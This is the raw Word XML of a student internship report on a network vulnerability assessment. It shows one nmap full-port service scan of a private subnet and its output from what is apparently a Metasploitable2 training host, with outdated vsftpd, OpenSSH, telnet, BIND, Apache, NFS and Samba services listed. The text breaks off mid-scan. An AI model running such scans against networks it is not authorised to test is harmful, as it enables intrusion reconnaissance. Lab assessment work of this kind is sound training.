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DEB65" w14:textId="77777777" w:rsidR="00804706" w:rsidRPr="003B1C1A" w:rsidRDefault="00BB65F6" w:rsidP="003B1C1A">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial Black" w:hAnsi="Arial Black" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003B1C1A">
        <w:rPr>
          <w:rFonts w:ascii="Arial Black" w:hAnsi="Arial Black" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Internship Report</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2323F6D8" w14:textId="7E370C14" w:rsidR="00804706" w:rsidRDefault="00E91154" w:rsidP="003B1C1A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 xml:space="preserve">Task 1. </w:t>
      </w:r>
      <w:r w:rsidR="00C0068A">
        <w:t>Network vulnerability assessment</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABB0BDB" w14:textId="77777777" w:rsidR="00E91154" w:rsidRDefault="00E91154">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3618D22E" w14:textId="0E772315" w:rsidR="00C0068A" w:rsidRPr="0024213C" w:rsidRDefault="00F323E3" w:rsidP="002421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 w:rsidRPr="0024213C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Network</w:t>
      </w:r>
      <w:r w:rsidR="00C0068A" w:rsidRPr="0024213C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> scanning</w:t>
      </w:r>
      <w:r w:rsidR="0024213C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4248FD" w14:textId="47FBCD5E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$ </w:t>
      </w:r>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>sudo nmap -p- 192.168.10.0/24 -sVC -n --disable-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>arp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-ping -T4 --max-retries 2 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>oN</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> scan.txt</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="709497D1" w14:textId="3E51A561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Starting Nmap 7.94SVN </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>( https://nmap.org</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> ) at 2024-11-22 12:09 EST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F91135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Nmap scan report for 192.168.10.54</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA04939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Host is up (0.0013s latency).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F25EE44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Not shown: 65505 closed tcp ports (reset)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D32896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PORT      STATE SERVICE     VERSION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CD56E9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21/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>open  ftp</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">         </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>vsftpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.3.4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E8BE81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|_ftp-anon: Anonymous FTP login allowed (FTP code 230)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48544E3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ftp-syst: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654A72B8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STAT: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="741FE0A5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FTP server status:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05FA180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   Connected to 192.168.10.68</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667952C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   Logged in as ftp</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="576AAFD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   TYPE: ASCII</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32E94A8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   No session bandwidth limit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ADD4BC7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   Session timeout in seconds is 300</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56B0DB3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   Control connection is plain text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59D7E47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   Data connections will be plain text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A6393C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   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>vsFTPd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2.3.4 - secure, fast, stable</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6927F847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|_End of status</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D6C993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22/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>open  ssh</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A3F335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ssh-hostkey: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A07DD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1024 60:0f:</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>cf:e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6907C17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</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_  2048</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699707A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23/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>open  telnet</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Linux </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>telnetd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="620DFF7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25/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>open  smtp</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Postfix </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>smtpd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4E0F4C7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|_smtp-commands: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>metasploitable.localdomain</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BF5DE0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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-date: 2024-11-22T17:10:54+00:00; +3s from scanner time.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6252A59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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-cert: Subject: commonName=ubuntu804-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>base.localdomain</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>countryName</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>=XX</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17A7EB9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Not valid before: 2010-03-17T14:07:45</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20062094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|_Not valid after:  2010-04-16T14:07:45</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="261C98F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53/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>open  domain</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      ISC BIND 9.4.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32263033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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dns-nsid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E13EBE4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</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">_  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>bind</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>.version</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>: 9.4.2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D4D821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80/tcp    </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>open  http</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Apache httpd 2.2.8 ((Ubuntu) DAV/2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0184745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|_http-title: Metasploitable2 - Linux</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5170DC9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|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71CC6227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111/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">open  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>rpcbind</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">     2 (RPC #100000)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48DE65C8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</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>rpcinfo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16F38DF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lastRenderedPageBreak/>
        <w:t>|   program version    port/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>proto  service</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="189ADEB5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100000  2</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            111/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>rpcbind</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="085E7749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100000  2</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">            111/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>udp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>rpcbind</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2B12E178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100003  2</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">,3,4       2049/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>nfs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0E608A0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100003  2</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>,3,4       2049/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>udp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>nfs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="289C8C7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100005  1</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>,2,3      49710/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>udp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>mountd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="18C6254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100005  1</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">,2,3      59993/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>mountd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="0490B91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100021  1</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>,3,4      43032/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>udp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>nlockmgr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3F184AF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100021  1</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">,3,4      43198/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>nlockmgr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2201C43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gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>100024  1</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">          37311/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>udp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">   status</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D273C9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</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>_  100024</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  1          49497/tcp   status</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CB0CA1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139/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">open  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>netbios</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-ssn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Samba </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>smbd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> 3.X - 4.X (workgroup: WORKGROUP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2546FAE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445/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">open  </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>netbios</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>-ssn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Samba </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C0068A">
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
